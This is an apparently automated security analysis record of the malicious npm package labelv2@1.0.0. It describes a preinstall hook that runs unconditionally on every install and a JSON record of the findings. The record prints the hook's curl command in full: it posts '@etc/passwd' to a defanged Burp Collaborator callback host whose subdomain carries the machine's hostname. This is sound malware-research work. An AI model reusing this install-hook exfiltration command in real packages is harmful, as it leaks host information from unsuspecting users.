# npm labelv2@1.0.0

**Source:** datadog · **Source label:** malicious · **Released:** 2024-09-17 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package has only a package.json, whose preinstall hook runs one shell command: `/usr/bin/curl --data '@etc/passwd' $(hostname)716c….oastify[.]com`. There are no gates; the command runs on every install. It sends the machine's hostname to an OAST (Burp Collaborator) callback host as part of the subdomain, through both the DNS lookup and the HTTP request. Any Linux or macOS host with curl and outbound DNS/HTTP triggers it.

## Execution

- **preinstall** `/usr/bin/curl --data '@etc/passwd' $(hostname)716c….oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

- os: linux (hook uses sh command substitution and /usr/bin/curl; darwin also works, win32 does not)
- installed_tool: curl (hook calls /usr/bin/curl by absolute path)
- network: <hostname>716c….oastify[.]com:80 (DNS lookup and HTTP POST to the OAST callback host carry the hostname; the DNS lookup alone leaks it)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- The `@etc/passwd` path is relative, so curl reads `etc/passwd` from the package root, which does not exist; the POST body is empty. Only the hostname leaks.
- The tool prefilled `download_then_exec`; corrected to `inline_shell` because nothing downloaded is run.
- The OAST subdomain id is redacted to its first 4 characters.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "labelv2",
    "version": "1.0.0",
    "archive_sha256": "38fb879c9e1e83bec2cd8da23c8a9215ffc8fff0f60495967eebfce3625d0ed0",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-09-17",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-09-19-labelv2-v1.0.0.zip",
    "package_root": "layer0/tmp/tmpoqs8iuxn/labelv2/package",
    "cluster_key": "38b559ad602e1fc5017a1ebddd3115391ec4172223aea6aeeb19f65ec259b37e",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data '@etc/passwd' $(hostname)716c….oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json is the only package file; the preinstall hook is a single curl command line, read in full. No JS files and no conditions anywhere.",
      "'@etc/passwd' has no leading slash, so curl looks for etc/passwd under the package root (hook cwd), which does not exist; curl warns and sends an empty POST. What leaks is the hostname in the request subdomain.",
      "The hook relies on sh $(hostname) substitution and /usr/bin/curl, so it only works on Linux or macOS and fails on Windows. Recorded as a requirement, not a gate.",
      "Prefilled launch_style download_then_exec was wrong: nothing fetched is executed. Changed to inline_shell."
    ]
  },
  "requirements": [
    {
      "axis": "os",
      "value": "linux",
      "reason": "hook uses sh command substitution and /usr/bin/curl; darwin also works, win32 does not"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "hook calls /usr/bin/curl by absolute path"
    },
    {
      "axis": "network",
      "value": "<hostname>716c….oastify[.]com:80",
      "reason": "DNS lookup and HTTP POST to the OAST callback host carry the hostname; the DNS lookup alone leaks it"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "$(hostname)716c….oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "malicious_new_package",
  "family_hint": "oast hostname callback probe",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally runs curl against an oastify (Burp Collaborator) host whose subdomain carries the machine's hostname, leaking it at install. The intended /etc/passwd upload fails because the path is relative, but the hostname still leaks.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@44d785b257",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
